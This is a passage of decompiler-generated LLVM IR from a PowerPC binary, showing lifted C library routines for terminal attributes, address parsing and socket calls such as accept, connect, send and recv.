  store i8 %v2_1000a5d8, i8* %v3_1000a5e4, align 1
  %v0_1000a5e8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a5e8 = add i32 %v0_1000a5e8, 1
  store i32 %v1_1000a5e8, i32* %r9.global-to-local, align 4
  %v0_1000a5ec = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000a5ec, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a5d8

dec_label_pc_1000a5f0:                            ; preds = %dec_label_pc_1000a5d8
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_1000a5e8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
}

define i32 @__GI_tcgetattr(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_2()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000a5f8 = load i32, i32* @lr, align 4
  store i32 %v0_1000a5f8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000a608 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268477980, i32* @lr, align 4
  %v3_1000a618 = call i32 @ioctl(i32 1076655123, i32 %v2_1000a608, i32 %v2_1000a608)
  store i32 %v3_1000a618, i32* @r30, align 4
  %v3_1000a61c = icmp eq i32 %v3_1000a618, 0
  store i1 %v3_1000a61c, i1* @cr0_eq, align 1
  br i1 %v3_1000a61c, label %dec_label_pc_1000a624, label %dec_label_pc_1000a678

dec_label_pc_1000a624:                            ; preds = %entry
  %v2_1000a628 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000a628, i32* @r4, align 4
  %v0_1000a638 = load i32, i32* @r31, align 4
  %v1_1000a638 = add i32 %v0_1000a638, 17
  %v4_1000a63c = zext i8 %tmp4 to i32
  store i32 %v4_1000a63c, i32* @r8, align 4
  %v3_1000a648 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_1000a648, i32* %r0.global-to-local, align 4
  %v2_1000a64c = add i32 %v0_1000a638, 4
  %v3_1000a64c = inttoptr i32 %v2_1000a64c to i32*
  store i32 %tmp7, i32* %v3_1000a64c, align 4
  %v0_1000a650 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a650 = load i32, i32* @r31, align 4
  %v2_1000a650 = inttoptr i32 %v1_1000a650 to i32*
  store i32 %v0_1000a650, i32* %v2_1000a650, align 4
  %v0_1000a654 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a654 = load i32, i32* @r31, align 4
  %v2_1000a654 = add i32 %v1_1000a654, 8
  %v3_1000a654 = inttoptr i32 %v2_1000a654 to i32*
  store i32 %v0_1000a654, i32* %v3_1000a654, align 4
  %v0_1000a658 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a658 = load i32, i32* @r31, align 4
  %v2_1000a658 = add i32 %v1_1000a658, 12
  %v3_1000a658 = inttoptr i32 %v2_1000a658 to i32*
  store i32 %v0_1000a658, i32* %v3_1000a658, align 4
  %v3_1000a65c = load i32, i32* @r31, align 4
  %v4_1000a65c = add i32 %v3_1000a65c, 16
  %v5_1000a65c = inttoptr i32 %v4_1000a65c to i8*
  store i8 %tmp4, i8* %v5_1000a65c, align 1
  %v1_1000a660 = load i32, i32* @r31, align 4
  %v2_1000a660 = add i32 %v1_1000a660, 52
  %v3_1000a660 = inttoptr i32 %v2_1000a660 to i32*
  store i32 %tmp3, i32* %v3_1000a660, align 4
  %v1_1000a664 = load i32, i32* @r31, align 4
  %v2_1000a664 = add i32 %v1_1000a664, 56
  %v3_1000a664 = inttoptr i32 %v2_1000a664 to i32*
  store i32 %tmp2, i32* %v3_1000a664, align 4
  store i32 268478060, i32* @lr, align 4
  %v6_1000a668 = sext i8 %tmp4 to i32
  %v8_1000a668 = call i32 @__GI_mempcpy(i32 %v1_1000a638, i32 %v2_1000a628, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_1000a668, i32 %tmp7)
  store i32 268478072, i32* @lr, align 4
  %v3_1000a674 = call i32 @__GI_memset(i32 %v8_1000a668, i32 0, i32 13)
  %v0_1000a67c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000a678

dec_label_pc_1000a678:                            ; preds = %entry, %dec_label_pc_1000a624
  %v0_1000a67c = phi i32 [ %v3_1000a618, %entry ], [ %v0_1000a67c.pre, %dec_label_pc_1000a624 ]
  store i32 %v0_1000a5f8, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000a67c

; uselistorder directives
  uselistorder i32 %v2_1000a608, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i8 %tmp4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a678, { 1, 0 }
}

define i32 @__GI_tcsetattr() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000a690 = load i32, i32* @r4, align 4
  %v3_1000a690 = icmp eq i32 %v0_1000a690, 1
  %v0_1000a6a0 = load i32, i32* @r3, align 4
  store i32 %v0_1000a6a0, i32* @r27, align 4
  %v0_1000a6a8 = load i32, i32* @r5, align 4
  store i32 %v0_1000a6a8, i32* @r31, align 4
  br i1 %v3_1000a690, label %dec_label_pc_1000a6cc, label %dec_label_pc_1000a6b0

dec_label_pc_1000a6b0:                            ; preds = %entry
  %v3_1000a6b0 = icmp eq i32 %v0_1000a690, 2
  br i1 %v3_1000a6b0, label %dec_label_pc_1000a6f8, label %dec_label_pc_1000a6b8

dec_label_pc_1000a6b8:                            ; preds = %dec_label_pc_1000a6b0
  %v3_1000a6b8 = icmp eq i32 %v0_1000a690, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_1000a6b8, label %dec_label_pc_1000a700, label %dec_label_pc_1000a6d8

dec_label_pc_1000a6cc:                            ; preds = %entry
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_1000a700

dec_label_pc_1000a6d8:                            ; preds = %dec_label_pc_1000a6b8
  store i32 -1, i32* @r28, align 4
  %v0_1000a6e8 = load i32, i32* @r2, align 4
  %v1_1000a6ec = add i32 %v0_1000a6e8, -28672
  store i32 %v1_1000a6ec, i32* %r9.global-to-local, align 4
  %v2_1000a6f0 = inttoptr i32 %v1_1000a6ec to i32*
  store i32 22, i32* %v2_1000a6f0, align 4
  br label %dec_label_pc_1000a7f0

dec_label_pc_1000a6f8:                            ; preds = %dec_label_pc_1000a6b0
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_1000a700

dec_label_pc_1000a700:                            ; preds = %dec_label_pc_1000a6b8, %dec_label_pc_1000a6cc, %dec_label_pc_1000a6f8
  %v1_1000a700 = inttoptr i32 %v0_1000a6a8 to i32*
  %v2_1000a700 = load i32, i32* %v1_1000a700, align 4
  store i32 19, i32* @r5, align 4
  %v1_1000a708 = add i32 %v0_1000a6a8, 4
  %v2_1000a708 = inttoptr i32 %v1_1000a708 to i32*
  %v3_1000a708 = load i32, i32* %v2_1000a708, align 4
  store i32 %v3_1000a708, i32* %r9.global-to-local, align 4
  %v1_1000a70c = add i32 %v0_1000a6a8, 17
  store i32 %v1_1000a70c, i32* @r4, align 4
  %v1_1000a710 = add i32 %v0_1000a6a8, 8
  %v2_1000a710 = inttoptr i32 %v1_1000a710 to i32*
  %v3_1000a710 = load i32, i32* %v2_1000a710, align 4
  %v2_1000a714 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000a714, i32* @r3, align 4
  %v2_1000a71c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000a71c, i32* @r26, align 4
  %v1_1000a720 = add i32 %v0_1000a6a8, 16
  %v2_1000a720 = inttoptr i32 %v1_1000a720 to i8*
  %v3_1000a720 = load i8, i8* %v2_1000a720, align 1
  %v4_1000a720 = zext i8 %v3_1000a720 to i32
  store i32 %v4_1000a720, i32* @r8, align 4
  store i32 %v2_1000a700, i32* %stack_var_-72, align 4
  store i32 268478284, i32* @lr, align 4
  %v0_1000a748 = call i32 @memcpy()
  %v0_1000a74c = load i32, i32* @r27, align 4
  %v0_1000a750 = load i32, i32* @r30, align 4
  store i32 268478304, i32* @lr, align 4
  %v3_1000a75c = call i32 @ioctl(i32 %v0_1000a74c, i32 %v0_1000a750, i32 %v2_1000a71c)
  store i32 %v3_1000a75c, i32* @r28, align 4
  %v3_1000a760 = icmp eq i32 %v3_1000a75c, 0
  br i1 %v3_1000a760, label %dec_label_pc_1000a768, label %dec_label_pc_1000a7f0

dec_label_pc_1000a768:                            ; preds = %dec_label_pc_1000a700
  %v0_1000a768 = load i32, i32* @r30, align 4
  %v3_1000a76c = icmp eq i32 %v0_1000a768, -2144570348
  br i1 %v3_1000a76c, label %dec_label_pc_1000a774, label %dec_label_pc_1000a7ec

dec_label_pc_1000a774:                            ; preds = %dec_label_pc_1000a768
  %v0_1000a780 = load i32, i32* @r27, align 4
  %v0_1000a784 = load i32, i32* @r2, align 4
  store i32 %v0_1000a784, i32* %r9.global-to-local, align 4
  %v1_1000a78c = add i32 %v0_1000a784, -28672
  store i32 %v1_1000a78c, i32* @r29, align 4
  %v1_1000a794 = inttoptr i32 %v1_1000a78c to i32*
  %v2_1000a794 = load i32, i32* %v1_1000a794, align 4
  store i32 %v2_1000a794, i32* @r30, align 4
  store i32 268478368, i32* @lr, align 4
  %v3_1000a79c = call i32 @ioctl(i32 %v0_1000a780, i32 1076655123, i32 %v2_1000a71c)
  %v3_1000a7a0 = icmp eq i32 %v3_1000a79c, 0
  br i1 %v3_1000a7a0, label %dec_label_pc_1000a7b0, label %dec_label_pc_1000a7a8

dec_label_pc_1000a7a8:                            ; preds = %dec_label_pc_1000a774
  %v0_1000a7a8 = load i32, i32* @r30, align 4
  %v1_1000a7a8 = load i32, i32* @r29, align 4
  %v2_1000a7a8 = inttoptr i32 %v1_1000a7a8 to i32*
  store i32 %v0_1000a7a8, i32* %v2_1000a7a8, align 4
  br label %dec_label_pc_1000a7f0

dec_label_pc_1000a7b0:                            ; preds = %dec_label_pc_1000a774
  %v0_1000a7b0 = load i32, i32* @r31, align 4
  %v1_1000a7b0 = add i32 %v0_1000a7b0, 8
  %v2_1000a7b0 = inttoptr i32 %v1_1000a7b0 to i32*
  %v3_1000a7b0 = load i32, i32* %v2_1000a7b0, align 4
  store i32 %v3_1000a7b0, i32* @r4, align 4
  %v1_1000a7b8 = call i32 @__asm_rlwinm(i32 %v3_1000a7b0, i32 0, i32 19, i32 20)
  %v1_1000a7bc = call i32 @__asm_rlwinm(i32 %v3_1000a710, i32 0, i32 19, i32 20)
  store i32 %v1_1000a7bc, i32* %r9.global-to-local, align 4
  %v4_1000a7c0 = icmp eq i32 %v1_1000a7b8, %v1_1000a7bc
  br i1 %v4_1000a7c0, label %dec_label_pc_1000a7c8, label %dec_label_pc_1000a7dc

dec_label_pc_1000a7c8:                            ; preds = %dec_label_pc_1000a7b0
  %v1_1000a7c8 = and i32 %v3_1000a7b0, 768
  store i32 %v1_1000a7c8, i32* %r9.global-to-local, align 4
  %v3_1000a7c8 = icmp eq i32 %v1_1000a7c8, 0
  br i1 %v3_1000a7c8, label %dec_label_pc_1000a7ec, label %dec_label_pc_1000a7d0

dec_label_pc_1000a7d0:                            ; preds = %dec_label_pc_1000a7c8
  %v1_1000a7d0 = call i32 @__asm_rlwinm(i32 %v3_1000a710, i32 0, i32 22, i32 23)
  %v0_1000a7d4 = load i32, i32* %r9.global-to-local, align 4
  %v4_1000a7d4 = icmp eq i32 %v0_1000a7d4, %v1_1000a7d0
  br i1 %v4_1000a7d4, label %dec_label_pc_1000a7ec, label %dec_label_pc_1000a7dc

dec_label_pc_1000a7dc:                            ; preds = %dec_label_pc_1000a7b0, %dec_label_pc_1000a7d0
  store i32 -1, i32* @r28, align 4
  %v1_1000a7e4 = load i32, i32* @r29, align 4
  %v2_1000a7e4 = inttoptr i32 %v1_1000a7e4 to i32*
  store i32 22, i32* %v2_1000a7e4, align 4
  br label %dec_label_pc_1000a7f0

dec_label_pc_1000a7ec:                            ; preds = %dec_label_pc_1000a768, %dec_label_pc_1000a7d0, %dec_label_pc_1000a7c8
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000a7f0

dec_label_pc_1000a7f0:                            ; preds = %dec_label_pc_1000a700, %dec_label_pc_1000a7dc, %dec_label_pc_1000a7a8, %dec_label_pc_1000a6d8, %dec_label_pc_1000a7ec
  %v0_1000a7f4 = load i32, i32* @r28, align 4
  ret i32 %v0_1000a7f4

; uselistorder directives
  uselistorder i32 %v0_1000a6a8, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_1000a7f0, { 4, 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000a7ec, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a7dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000a700, { 2, 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000a810 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000a810, i32* @r4, align 4
  %v1_1000a818 = bitcast i32* %stack_var_-24 to i8*
  %v2_1000a818 = call i32 @inet_aton(i8* %v1_1000a818)
  %v3_1000a81c = icmp eq i32 %v2_1000a818, 0
  br i1 %v3_1000a81c, label %dec_label_pc_1000a82c, label %dec_label_pc_1000a828

dec_label_pc_1000a828:                            ; preds = %entry
  %v3_1000a828 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000a82c

dec_label_pc_1000a82c:                            ; preds = %entry, %dec_label_pc_1000a828
  %v0_1000a838 = phi i32 [ -1, %entry ], [ %v3_1000a828, %dec_label_pc_1000a828 ]
  ret i32 %v0_1000a838

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a82c, { 1, 0 }
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %v0_1000a844 = call i32 @__asm_mfcr()
  %v1_1000a848 = and i32 %v0_1000a844, 268435456
  %v3_1000a848 = icmp eq i32 %v1_1000a848, 0
  %v0_1000a850 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a848, i32 %v0_1000a850)
  %v0_1000a860 = load i32, i32* @r2, align 4
  %v1_1000a864 = add i32 %v0_1000a860, -28672
  store i32 %v1_1000a864, i32* @r9, align 4
  %v2_1000a868 = inttoptr i32 %v1_1000a864 to i32*
  store i32 %v0_1000a844, i32* %v2_1000a868, align 4
  ret i32 -1
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r31, align 4
  %v0_1000a88c = load i32, i32* @r2, align 4
  %v1_1000a88c = add i32 %v0_1000a88c, -29808
  %v2_1000a88c = inttoptr i32 %v1_1000a88c to i32*
  %v3_1000a88c = load i32, i32* %v2_1000a88c, align 4
  %v3_1000a890 = icmp eq i32 %v3_1000a88c, 0
  br i1 %v3_1000a890, label %dec_label_pc_1000a898, label %dec_label_pc_1000a8ac

dec_label_pc_1000a898:                            ; preds = %entry
  %v0_1000a8a8 = call i32 @__sys_accept()
  br label %dec_label_pc_1000a8ac

dec_label_pc_1000a8ac:                            ; preds = %entry, %dec_label_pc_1000a898
  store i32 268478640, i32* @lr, align 4
  %v0_1000a8ac = call i32 @__libc_enable_asynccancel()
  store i32 268478660, i32* @lr, align 4
  %v0_1000a8c0 = call i32 @__sys_accept()
  store i32 %v0_1000a8c0, i32* @r29, align 4
  %v1_1000a8cc = call i32 @__libc_disable_asynccancel(i32 %v0_1000a8ac)
  %v0_1000a8d4 = load i32, i32* @r29, align 4
  ret i32 %v0_1000a8d4

; uselistorder directives
  uselistorder label %dec_label_pc_1000a8ac, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_1000a8f0 = call i32 @__asm_mfcr()
  %v1_1000a8f4 = and i32 %v0_1000a8f0, 268435456
  %v3_1000a8f4 = icmp eq i32 %v1_1000a8f4, 0
  %v0_1000a8fc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a8f4, i32 %v0_1000a8fc)
  %v0_1000a90c = load i32, i32* @r2, align 4
  %v1_1000a910 = add i32 %v0_1000a90c, -28672
  %v2_1000a914 = inttoptr i32 %v1_1000a910 to i32*
  store i32 %v0_1000a8f0, i32* %v2_1000a914, align 4
  ret i32 -1
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %v0_1000a924 = call i32 @__asm_mfcr()
  %v1_1000a928 = and i32 %v0_1000a924, 268435456
  %v3_1000a928 = icmp eq i32 %v1_1000a928, 0
  %v0_1000a930 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a928, i32 %v0_1000a930)
  %v0_1000a940 = load i32, i32* @r2, align 4
  %v1_1000a944 = add i32 %v0_1000a940, -28672
  store i32 %v1_1000a944, i32* @r9, align 4
  %v2_1000a948 = inttoptr i32 %v1_1000a944 to i32*
  store i32 %v0_1000a924, i32* %v2_1000a948, align 4
  ret i32 -1
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  store i32 %arg3, i32* @r31, align 4
  %v0_1000a96c = load i32, i32* @r2, align 4
  %v1_1000a96c = add i32 %v0_1000a96c, -29808
  %v2_1000a96c = inttoptr i32 %v1_1000a96c to i32*
  %v3_1000a96c = load i32, i32* %v2_1000a96c, align 4
  %v3_1000a970 = icmp eq i32 %v3_1000a96c, 0
  br i1 %v3_1000a970, label %dec_label_pc_1000a978, label %dec_label_pc_1000a98c

dec_label_pc_1000a978:                            ; preds = %entry
  %v0_1000a988 = call i32 @__sys_connect()
  br label %dec_label_pc_1000a98c

dec_label_pc_1000a98c:                            ; preds = %entry, %dec_label_pc_1000a978
  store i32 268478864, i32* @lr, align 4
  %v0_1000a98c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_1000a98c, i32* @r28, align 4
  store i32 268478884, i32* @lr, align 4
  %v0_1000a9a0 = call i32 @__sys_connect()
  store i32 %v0_1000a9a0, i32* @r29, align 4
  %v0_1000a9a8 = load i32, i32* @r28, align 4
  %v1_1000a9ac = call i32 @__libc_disable_asynccancel(i32 %v0_1000a9a8)
  %v0_1000a9b4 = load i32, i32* @r29, align 4
  ret i32 %v0_1000a9b4

; uselistorder directives
  uselistorder label %dec_label_pc_1000a98c, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_1000a9d0 = call i32 @__asm_mfcr()
  %v1_1000a9d4 = and i32 %v0_1000a9d0, 268435456
  %v3_1000a9d4 = icmp eq i32 %v1_1000a9d4, 0
  %v0_1000a9dc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a9d4, i32 %v0_1000a9dc)
  %v0_1000a9ec = load i32, i32* @r2, align 4
  %v1_1000a9f0 = add i32 %v0_1000a9ec, -28672
  %v2_1000a9f4 = inttoptr i32 %v1_1000a9f0 to i32*
  store i32 %v0_1000a9d0, i32* %v2_1000a9f4, align 4
  ret i32 -1
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_1000aa04 = call i32 @__asm_mfcr()
  %v1_1000aa08 = and i32 %v0_1000aa04, 268435456
  %v3_1000aa08 = icmp eq i32 %v1_1000aa08, 0
  %v0_1000aa10 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000aa08, i32 %v0_1000aa10)
  %v0_1000aa20 = load i32, i32* @r2, align 4
  %v1_1000aa24 = add i32 %v0_1000aa20, -28672
  %v2_1000aa28 = inttoptr i32 %v1_1000aa24 to i32*
  store i32 %v0_1000aa04, i32* %v2_1000aa28, align 4
  ret i32 -1
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000aa38 = call i32 @__asm_mfcr()
  %v1_1000aa3c = and i32 %v0_1000aa38, 268435456
  %v3_1000aa3c = icmp eq i32 %v1_1000aa3c, 0
  %v0_1000aa44 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000aa3c, i32 %v0_1000aa44)
  %v0_1000aa54 = load i32, i32* @r2, align 4
  %v1_1000aa58 = add i32 %v0_1000aa54, -28672
  %v2_1000aa5c = inttoptr i32 %v1_1000aa58 to i32*
  store i32 %v0_1000aa38, i32* %v2_1000aa5c, align 4
  ret i32 -1
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %v0_1000aa6c = call i32 @__asm_mfcr()
  %v1_1000aa70 = and i32 %v0_1000aa6c, 268435456
  %v3_1000aa70 = icmp eq i32 %v1_1000aa70, 0
  %v0_1000aa78 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000aa70, i32 %v0_1000aa78)
  %v0_1000aa88 = load i32, i32* @r2, align 4
  %v1_1000aa8c = add i32 %v0_1000aa88, -28672
  store i32 %v1_1000aa8c, i32* @r9, align 4
  %v2_1000aa90 = inttoptr i32 %v1_1000aa8c to i32*
  store i32 %v0_1000aa6c, i32* %v2_1000aa90, align 4
  ret i32 -1
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r31, align 4
  store i32 %arg4, i32* @r30, align 4
  %v0_1000aab8 = load i32, i32* @r2, align 4
  %v1_1000aab8 = add i32 %v0_1000aab8, -29808
  %v2_1000aab8 = inttoptr i32 %v1_1000aab8 to i32*
  %v3_1000aab8 = load i32, i32* %v2_1000aab8, align 4
  %v3_1000aabc = icmp eq i32 %v3_1000aab8, 0
  br i1 %v3_1000aabc, label %dec_label_pc_1000aac4, label %dec_label_pc_1000aad8

dec_label_pc_1000aac4:                            ; preds = %entry
  %v0_1000aad4 = call i32 @__sys_recv()
  br label %dec_label_pc_1000aad8

dec_label_pc_1000aad8:                            ; preds = %entry, %dec_label_pc_1000aac4
  store i32 268479196, i32* @lr, align 4
  %v0_1000aad8 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_1000aad8, i32* @r28, align 4
  store i32 268479220, i32* @lr, align 4
  %v0_1000aaf0 = call i32 @__sys_recv()
  store i32 %v0_1000aaf0, i32* @r29, align 4
  %v0_1000aaf8 = load i32, i32* @r28, align 4
  %v1_1000aafc = call i32 @__libc_disable_asynccancel(i32 %v0_1000aaf8)
  %v0_1000ab04 = load i32, i32* @r29, align 4
  ret i32 %v0_1000ab04

; uselistorder directives
  uselistorder label %dec_label_pc_1000aad8, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %v0_1000ab20 = call i32 @__asm_mfcr()
  %v1_1000ab24 = and i32 %v0_1000ab20, 268435456
  %v3_1000ab24 = icmp eq i32 %v1_1000ab24, 0
  %v0_1000ab2c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000ab24, i32 %v0_1000ab2c)
  %v0_1000ab3c = load i32, i32* @r2, align 4
  %v1_1000ab40 = add i32 %v0_1000ab3c, -28672
  store i32 %v1_1000ab40, i32* @r9, align 4
  %v2_1000ab44 = inttoptr i32 %v1_1000ab40 to i32*
  store i32 %v0_1000ab20, i32* %v2_1000ab44, align 4
  ret i32 -1
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg3, i32* @r31, align 4
  %v0_1000ab6c = load i32, i32* @r2, align 4
  %v1_1000ab6c = add i32 %v0_1000ab6c, -29808
  %v2_1000ab6c = inttoptr i32 %v1_1000ab6c to i32*
  %v3_1000ab6c = load i32, i32* %v2_1000ab6c, align 4
  store i32 %arg5, i32* @r27, align 4
  store i32 %arg6, i32* @r26, align 4
  %v3_1000ab78 = icmp eq i32 %v3_1000ab6c, 0
  br i1 %v3_1000ab78, label %dec_label_pc_1000ab80, label %dec_label_pc_1000ab94

dec_label_pc_1000ab80:                            ; preds = %entry
  %v0_1000ab90 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_1000ab94

dec_label_pc_1000ab94:                            ; preds = %entry, %dec_label_pc_1000ab80
  store i32 268479384, i32* @lr, align 4
  %v0_1000ab94 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_1000ab94, i32* @r28, align 4
  %v0_1000abac = load i32, i32* @r26, align 4
  store i32 %v0_1000abac, i32* @r8, align 4
  store i32 268479416, i32* @lr, align 4
  %v0_1000abb4 = call i32 @__sys_recvfrom()
  store i32 %v0_1000abb4, i32* @r29, align 4
  %v0_1000abbc = load i32, i32* @r28, align 4
  %v1_1000abc0 = call i32 @__libc_disable_asynccancel(i32 %v0_1000abbc)
  %v0_1000abc8 = load i32, i32* @r29, align 4
  ret i32 %v0_1000abc8

; uselistorder directives
  uselistorder label %dec_label_pc_1000ab94, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %v0_1000abe4 = call i32 @__asm_mfcr()
  %v1_1000abe8 = and i32 %v0_1000abe4, 268435456
  %v3_1000abe8 = icmp eq i32 %v1_1000abe8, 0
  %v0_1000abf0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000abe8, i32 %v0_1000abf0)
  %v0_1000ac00 = load i32, i32* @r2, align 4
  %v1_1000ac04 = add i32 %v0_1000ac00, -28672
  store i32 %v1_1000ac04, i32* @r9, align 4
  %v2_1000ac08 = inttoptr i32 %v1_1000ac04 to i32*
  store i32 %v0_1000abe4, i32* %v2_1000ac08, align 4
  ret i32 -1
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r31, align 4
  store i32 %arg4, i32* @r30, align 4
  %v0_1000ac30 = load i32, i32* @r2, align 4
  %v1_1000ac30 = add i32 %v0_1000ac30, -29808
  %v2_1000ac30 = inttoptr i32 %v1_1000ac30 to i32*
  %v3_1000ac30 = load i32, i32* %v2_1000ac30, align 4
  %v3_1000ac34 = icmp eq i32 %v3_1000ac30, 0
  br i1 %v3_1000ac34, label %dec_label_pc_1000ac3c, label %dec_label_pc_1000ac50

dec_label_pc_1000ac3c:                            ; preds = %entry
  %v0_1000ac4c = call i32 @__sys_send()
  br label %dec_label_pc_1000ac50

dec_label_pc_1000ac50:                            ; preds = %entry, %dec_label_pc_1000ac3c
  store i32 268479572, i32* @lr, align 4
  %v0_1000ac50 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_1000ac50, i32* @r28, align 4
  store i32 268479596, i32* @lr, align 4
  %v0_1000ac68 = call i32 @__sys_send()
  store i32 %v0_1000ac68, i32* @r29, align 4
  %v0_1000ac70 = load i32, i32* @r28, align 4
  %v1_1000ac74 = call i32 @__libc_disable_asynccancel(i32 %v0_1000ac70)
  %v0_1000ac7c = load i32, i32* @r29, align 4
  ret i32 %v0_1000ac7c

; uselistorder directives
  uselistorder label %dec_label_pc_1000ac50, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %v0_1000ac98 = call i32 @__asm_mfcr()
  %v1_1000ac9c = and i32 %v0_1000ac98, 268435456
  %v3_1000ac9c = icmp eq i32 %v1_1000ac9c, 0
  %v0_1000aca4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000ac9c, i32 %v0_1000aca4)
  %v0_1000acb4 = load i32, i32* @r2, align 4
  %v1_1000acb8 = add i32 %v0_1000acb4, -28672
  store i32 %v1_1000acb8, i32* @r9, align 4
  %v2_1000acbc = inttoptr i32 %v1_1000acb8 to i32*
  store i32 %v0_1000ac98, i32* %v2_1000acbc, align 4
  ret i32 -1
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg3, i32* @r31, align 4
  store i32 %arg4, i32* @r30, align 4
  %v0_1000ace4 = load i32, i32* @r2, align 4
  %v1_1000ace4 = add i32 %v0_1000ace4, -29808
  %v2_1000ace4 = inttoptr i32 %v1_1000ace4 to i32*
  %v3_1000ace4 = load i32, i32* %v2_1000ace4, align 4
  store i32 %arg5, i32* @r27, align 4
  store i32 %arg6, i32* @r26, align 4
  %v3_1000acf0 = icmp eq i32 %v3_1000ace4, 0
  br i1 %v3_1000acf0, label %dec_label_pc_1000acf8, label %dec_label_pc_1000ad0c

dec_label_pc_1000acf8:                            ; preds = %entry
  %v0_1000ad08 = call i32 @__sys_sendto()
  br label %dec_label_pc_1000ad0c

dec_label_pc_1000ad0c:                            ; preds = %entry, %dec_label_pc_1000acf8
  store i32 268479760, i32* @lr, align 4
  %v0_1000ad0c = call i32 @__libc_enable_asynccancel()
  store i32 268479792, i32* @lr, align 4
